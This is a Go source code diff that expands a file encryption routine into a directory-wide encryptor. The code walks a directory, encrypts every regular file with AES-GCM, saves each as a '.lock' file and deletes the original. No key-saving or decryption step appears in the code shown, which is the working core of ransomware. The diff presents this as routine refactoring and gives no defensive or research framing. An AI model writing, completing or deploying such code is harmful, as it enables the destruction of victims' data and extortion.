@@ -7,9 +7,10 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"path/filepath"
 )
 
-// Function to generate AES-256 key
+// GenerateAESKey generates a 256-bit AES key
 func GenerateAESKey() []byte {
 	key := make([]byte, 32) // 32 bytes = 256 bits
 	_, err := rand.Read(key)
@@ -19,13 +20,8 @@ func GenerateAESKey() []byte {
 	return key
 }
 
-// Helper function to create the ".enc" file extension
-func CreateEncryptedFileName(filename string) string {
-	return filename + ".lock"
-}
-
-// Function to encrypt the file
-func EncryptFile(inputFile string, key []byte) error {
+// EncryptFile encrypts a single file and saves it with a .enc extension
+func EncryptFile(filePath string, key []byte) error {
 	// Create AES cipher block
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -45,41 +41,63 @@ func EncryptFile(inputFile string, key []byte) error {
 	}
 
 	// Open the input file for reading
-	inFile, err := os.Open(inputFile)
+	inFile, err := os.Open(filePath)
 	if err != nil {
-		return fmt.Errorf("could not open input file: %v", err)
+		return fmt.Errorf("could not open file %v: %v", filePath, err)
 	}
 	defer inFile.Close()
 
-	// Read the content of the file
+	// Read the file content
 	fileContent, err := io.ReadAll(inFile)
 	if err != nil {
-		return fmt.Errorf("could not read input file: %v", err)
+		return fmt.Errorf("could not read file %v: %v", filePath, err)
 	}
 
 	// Encrypt the content
 	ciphertext := aesgcm.Seal(nonce, nonce, fileContent, nil)
 
-	// Create encrypted file
-	encFileName := CreateEncryptedFileName(inputFile)
-	outFile, err := os.Create(encFileName)
+	// Create the output file with the ".lock" extension
+	encFilePath := filePath + ".lock"
+	outFile, err := os.Create(encFilePath)
 	if err != nil {
-		return fmt.Errorf("could not create encrypted file: %v", err)
+		return fmt.Errorf("could not create encrypted file %v: %v", encFilePath, err)
 	}
 	defer outFile.Close()
 
 	// Write the encrypted content to the new file
 	_, err = outFile.Write(ciphertext)
 	if err != nil {
-		return fmt.Errorf("could not write to encrypted file: %v", err)
+		return fmt.Errorf("could not write to encrypted file %v: %v", encFilePath, err)
 	}
 
-	// Remove the original file
-	err = os.Remove(inputFile)
+	// Remove the original file after encryption
+	err = os.Remove(filePath)
 	if err != nil {
-		return fmt.Errorf("could not remove original file: %v", err)
+		return fmt.Errorf("could not delete original file %v: %v", filePath, err)
 	}
 
+	fmt.Printf("Encrypted %s -> %s\n", filePath, encFilePath)
 	return nil
+}
+
+// EncryptFilesInDirectory encrypts all files in a given directory
+func EncryptFilesInDirectory(dirPath string, key []byte) error {
+	// Walk through all files in the directory
+	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		// Check if it's a regular file (not a directory)
+		if !info.IsDir() {
+			// Encrypt the file
+			err := EncryptFile(path, key)
+			if err != nil {
+				fmt.Printf("Failed to encrypt file %s: %v\n", path, err)
+			}
+		}
+		return nil
+	})
+	return err
 }
 
